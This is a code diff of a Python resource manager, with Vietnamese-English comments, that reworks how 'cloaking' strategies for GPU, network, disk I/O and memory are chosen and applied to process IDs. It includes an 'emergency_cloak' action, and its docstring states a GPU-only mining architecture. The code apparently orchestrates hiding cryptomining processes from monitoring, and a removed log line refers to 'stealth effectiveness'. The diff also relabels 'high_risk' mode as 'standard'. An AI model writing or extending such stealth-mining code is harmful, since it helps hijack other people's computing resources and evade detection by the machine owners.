-                                self.logger.info(f"✅ [PHASE1-STANDARD] Using standard strategies: {strategies}")
+                    # **UNIFIED STRATEGY DETERMINATION** (xác định chiến lược thống nhất)
+                    strategies = task.get('strategies', [])
+                    if not strategies:
+                        # **Auto-determine strategies based on task action** (tự động xác định chiến lược)
+                        if task_action == 'emergency_cloak':
+                            strategies = ['network', 'disk_io']  # Safe emergency strategies
+                            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Using emergency strategies: {strategies}")
+                        elif fallback_mode:
+                            strategies = ['network', 'disk_io', 'cache']  # Conservative fallback
+                            self.logger.info(f"🔄 [UNIFIED-FALLBACK] Using fallback strategies: {strategies}")
+                        else:
+                            strategies = ['gpu_cloaking', 'network', 'memory']  # Standard strategies
+                            self.logger.info(f"✅ [UNIFIED-STANDARD] Using standard strategies: {strategies}")
                     
-                    strategy_hints = task.get('strategy_hints', {})
-                    primary_strategy = strategies[0] if strategies else 'gpu_cloaking'
+                    primary_strategy = strategies[0] if strategies else 'network'
                     additional_strategies = strategies[1:] if len(strategies) > 1 else []
                     
-                    self.logger.info(f"🎯 [PHASE1-STRATEGIES] Applying {len(strategies)} strategies cho PID={pid}")
-                    self.logger.info(f"🔧 [PHASE1-STRATEGIES] Primary: {primary_strategy}, Additional: {additional_strategies}")
+                    self.logger.info(f"🎯 [UNIFIED-STRATEGIES] Applying {len(strategies)} strategies cho PID={pid}")
+                    self.logger.info(f"🔧 [UNIFIED-STRATEGIES] Primary: {primary_strategy}, Additional: {additional_strategies}")
                     
                     # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                     strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
-                    # **PHASE 1: Enhanced Memory-Safe Coordination** (phối hợp an toàn bộ nhớ nâng cao)
+                    # **UNIFIED COORDINATION STATUS** (trạng thái phối hợp thống nhất)
                     coordination_verified = coordination_status  # Use task-provided coordination status
                     
-                    if not coordination_status and not fallback_mode:
-                        # **Attempt real-time coordination check** (thử kiểm tra coordination thời gian thực)
-                        try:
-                            coordinator = self._import_hook_coordinator()
-                            if coordinator and coordinator.check_hooks_ready(pid):
-                                coordination_verified = True
-                                self.logger.info(f"🔒 [PHASE1-COORD] Real-time coordination verified cho PID={pid}")
-                            else:
-                                self.logger.warning(f"⚠️ [PHASE1-COORD] Real-time coordination check failed cho PID={pid}")
-                        except Exception as coord_check_err:
-                            self.logger.warning(f"⚠️ [PHASE1-COORD] Coordination check exception: {coord_check_err}")
-                    
-                    # **PHASE 1: Log coordination status** (ghi log trạng thái coordination)
+                    # **Log coordination mode** (ghi log chế độ phối hợp)
                     if coordination_verified:
-                        self.logger.info(f"🔒 [PHASE1-SAFE] Hook coordination confirmed cho PID={pid} - safe to proceed")
+                        self.logger.info(f"🔒 [UNIFIED-SAFE] Hook coordination confirmed cho PID={pid} - safe to proceed")
                     elif fallback_mode:
-                        self.logger.info(f"🔄 [PHASE1-FALLBACK] Using fallback mode cho PID={pid} - conservative strategies")
+                        self.logger.info(f"🔄 [UNIFIED-FALLBACK] Using fallback mode cho PID={pid} - conservative strategies")
                     else:
-                        self.logger.warning(f"⚠️ [PHASE1-RISK] No coordination + no fallback cho PID={pid} - high risk mode")
+                        self.logger.info(f"ℹ️ [UNIFIED-NORMAL] Normal processing mode cho PID={pid}")
                     
                     # **Strategy processing started** (bắt đầu xử lý chiến lược)
                     self.logger.debug(f"Processing {len(strategies)} strategies for PID={pid}, coordination: {coordination_verified}")
                     
                     for strat in strategies:
                         try:
-                            # **PHASE 1: Enhanced Memory-Safe Strategy Filtering** (lọc chiến lược an toàn bộ nhớ nâng cao)
+                            # **UNIFIED STRATEGY SAFETY CHECK** (kiểm tra an toàn chiến lược thống nhất)
                             strategy_safe = True
                             skip_reason = None
                             
-                            # **High-risk strategy check** (kiểm tra chiến lược nguy hiểm cao)
+                            # **High-risk strategy filtering** (lọc chiến lược nguy hiểm cao)
                             if strat in ['gpu_cloaking', 'memory'] and not coordination_verified:
                                 if fallback_mode:
-                                    # **Fallback mode allows limited memory strategies** (chế độ fallback cho phép chiến lược bộ nhớ hạn chế)
+                                    # **Memory pressure check in fallback mode** (kiểm tra áp lực bộ nhớ trong chế độ fallback)
                                     memory_pressure = self.monitor_memory_pressure()
                                     if memory_pressure['pressure_level'] in ['LOW', 'MODERATE']:
-                                        self.logger.info(f"🔄 [PHASE1-FALLBACK] Strategy {strat} allowed in fallback mode - low memory pressure")
+                                        self.logger.info(f"🔄 [UNIFIED-FALLBACK] Strategy {strat} allowed - acceptable memory pressure")
                                     else:
                                         strategy_safe = False
-                                        skip_reason = f"fallback_high_memory_pressure_{memory_pressure['pressure_level']}"
+                                        skip_reason = f"high_memory_pressure_{memory_pressure['pressure_level']}"
                                 else:
-                                    # **Non-fallback mode requires coordination** (chế độ không phải fallback yêu cầu coordination)
+                                    # **Non-coordinated high-risk strategy** (chiến lược nguy hiểm cao không phối hợp)
                                     strategy_safe = False
-                                    skip_reason = "no_coordination_high_risk_strategy"
+                                    skip_reason = "uncoordinated_high_risk_strategy"
                             
                             if not strategy_safe:
-                                self.logger.warning(f"⚠️ [PHASE1-SAFETY] Strategy {strat} blocked - {skip_reason}")
+                                self.logger.warning(f"⚠️ [UNIFIED-SAFETY] Strategy {strat} blocked - {skip_reason}")
                                 strategy_results['failed'].append(strat)
                                 continue
                             
-                            # **PHASE 1: Strategy allowed - proceed** (chiến lược được cho phép - tiến hành)
-                            self.logger.debug(f"✅ [PHASE1-ALLOW] Strategy {strat} approved cho PID={pid}")
+                            # **Strategy approved for execution** (chiến lược được phê duyệt thực thi)
+                            self.logger.debug(f"✅ [UNIFIED-ALLOW] Strategy {strat} approved cho PID={pid}")
                             
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
@@ -2106,12 +1958,12 @@ class ResourceManager(IResourceManager):
                         success_level = "FULL" if failed_count == 0 else "PARTIAL"
                         
                         # **PHASE 1: Enhanced success reporting** (báo cáo thành công nâng cao)
-                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "high_risk")
-                        self.logger.info(f"✅ [PHASE1-SUCCESS] {success_level} {task_type} completed cho PID={pid}")
-                        self.logger.info(f"🎯 [PHASE1-STATS] Mode: {cloaking_mode}, Success: {applied_count}/{strategy_results['total']} ({success_rate:.1f}%)")
-                        self.logger.info(f"📊 [PHASE1-APPLIED] Strategies: {strategy_results['applied']}")
+                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "standard")
+                        self.logger.info(f"✅ [UNIFIED-SUCCESS] {success_level} {task_action} completed cho PID={pid}")
+                        self.logger.info(f"🎯 [UNIFIED-STATS] Mode: {cloaking_mode}, Success: {applied_count}/{strategy_results['total']} ({success_rate:.1f}%)")
+                        self.logger.info(f"📊 [UNIFIED-APPLIED] Strategies: {strategy_results['applied']}")
                         
-                        # **PHASE 1: Enhanced metrics tracking** (theo dõi metrics nâng cao)
+                        # **UNIFIED METRICS TRACKING** (theo dõi metrics thống nhất)
                         self._record_strategy_metrics(pid, 'success', {
                             'applied_count': applied_count,
                             'total_count': strategy_results['total'],
@@ -2120,32 +1972,32 @@ class ResourceManager(IResourceManager):
                             'strategies': strategy_results['applied'],
                             'coordination_status': coordination_verified,
                             'fallback_mode': fallback_mode,
-                            'task_type': task_type,
+                            'task_action': task_action,
+                            'task_source': task_source,
                             'cloaking_mode': cloaking_mode
                         })
                         
                         if failed_count > 0:
-                            self.logger.warning(f"⚠️ [PHASE1-FAILED] Failed strategies: {strategy_results['failed']}")
+                            self.logger.warning(f"⚠️ [UNIFIED-FAILED] Failed strategies: {strategy_results['failed']}")
                             
-                        # **PHASE 1: Enhanced primary strategy check** (kiểm tra chiến lược chính nâng cao)
+                        # **PRIMARY STRATEGY STATUS** (trạng thái chiến lược chính)
                         if primary_applied:
-                            self.logger.info(f"🎯 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' successfully applied")
+                            self.logger.info(f"🎯 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' successfully applied")
                         else:
-                            # **Different handling based on mode** (xử lý khác nhau dựa trên chế độ)
                             if fallback_mode:
-                                self.logger.info(f"🔄 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' failed in fallback mode - expected")
+                                self.logger.info(f"🔄 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' failed in fallback mode - expected")
                             else:
-                                self.logger.warning(f"🚨 [PHASE1-PRIMARY] Primary strategy '{primary_strategy}' failed - reduced stealth effectiveness")
+                                self.logger.warning(f"🚨 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' failed - reduced effectiveness")
                     else:
-                        # **PHASE 1: Enhanced complete failure handling** (xử lý thất bại hoàn toàn nâng cao)
+                        # **UNIFIED COMPLETE FAILURE HANDLING** (xử lý thất bại hoàn toàn thống nhất)
                         self.process_states[pid] = "cloaking_failed"
-                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "high_risk")
+                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "standard")
                         
-                        self.logger.error(f"❌ [PHASE1-FAILED] Complete {task_type} failure cho PID={pid}")
-                        self.logger.error(f"💀 [PHASE1-FAILED] Mode: {cloaking_mode}, Success: 0/{strategy_results['total']} (0% rate)")
-                        self.logger.error(f"💀 [PHASE1-FAILED] All strategies failed: {strategy_results['failed']}")
+                        self.logger.error(f"❌ [UNIFIED-FAILED] Complete {task_action} failure cho PID={pid}")
+                        self.logger.error(f"💀 [UNIFIED-FAILED] Mode: {cloaking_mode}, Success: 0/{strategy_results['total']} (0% rate)")
+                        self.logger.error(f"💀 [UNIFIED-FAILED] All strategies failed: {strategy_results['failed']}")
                         
-                        # **PHASE 1: Enhanced failure metrics** (metrics thất bại nâng cao)
+                        # **UNIFIED FAILURE METRICS** (metrics thất bại thống nhất)
                         self._record_strategy_metrics(pid, 'failure', {
                             'failed_count': failed_count,
                             'total_count': strategy_results['total'],
@@ -2154,16 +2006,17 @@ class ResourceManager(IResourceManager):
                             'strategies': strategy_results['failed'],
                             'coordination_status': coordination_verified,
                             'fallback_mode': fallback_mode,
-                            'task_type': task_type,
+                            'task_action': task_action,
+                            'task_source': task_source,
                             'cloaking_mode': cloaking_mode,
                             'failure_mode': 'complete_failure'
                         })
                         
-                        # **PHASE 1: Failure recovery suggestion** (gợi ý khôi phục thất bại)
-                        if not fallback_mode and task_type != 'emergency_cloak':
-                            self.logger.warning(f"💡 [PHASE1-RECOVERY] Consider manual intervention or emergency fallback cho PID={pid}")
-                        elif task_type == 'emergency_cloak':
-                            self.logger.critical(f"🚨 [PHASE1-CRITICAL] Emergency cloaking failed - system may be compromised cho PID={pid}")
+                        # **FAILURE RECOVERY SUGGESTIONS** (gợi ý khôi phục thất bại)
+                        if task_action == 'emergency_cloak':
+                            self.logger.critical(f"🚨 [UNIFIED-CRITICAL] Emergency cloaking failed - system may be compromised cho PID={pid}")
+                        elif not fallback_mode:
+                            self.logger.warning(f"💡 [UNIFIED-RECOVERY] Consider emergency fallback cho PID={pid}")
                 
                 # ✅ CACHE METRICS: Periodic cache performance logging
                 self._log_cache_metrics_if_needed()
@@ -2193,12 +2046,21 @@ class ResourceManager(IResourceManager):
             return []
 
     def get_process_priority(self, process_name: str) -> int:
-        priority_map = self.config.process_priority_map
-        pri_val = priority_map.get(process_name.lower(), 1)
-        if not isinstance(pri_val, int):
-            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
-            return 1
-        return pri_val
+        """
+        **Get Process Priority** (lấy độ ưu tiên tiến trình)
+        
+        **DEPRECATED**: GPU-only mining architecture không cần **process-based priority differentiation**.
+        Tất cả GPU mining processes đều có **priority = 2** (GPU process priority).
+        
+        Args:
+            process_name: Process name (tên tiến trình) - **ignored trong GPU-only mode**
+            
+        Returns:
+            int: Always returns 2 (GPU process priority) cho **GPU mining processes**
+        """
+        # **GPU-ONLY MODE**: All mining processes are GPU processes với priority = 2
+        self.logger.debug(f"🎮 [GPU-PRIORITY] Process '{process_name}' assigned GPU priority = 2 (GPU-only mode)")
+        return 2
 
     def _initialize_gpu_monitoring(self, resource_managers: Dict[str, Any]) -> None:
         """
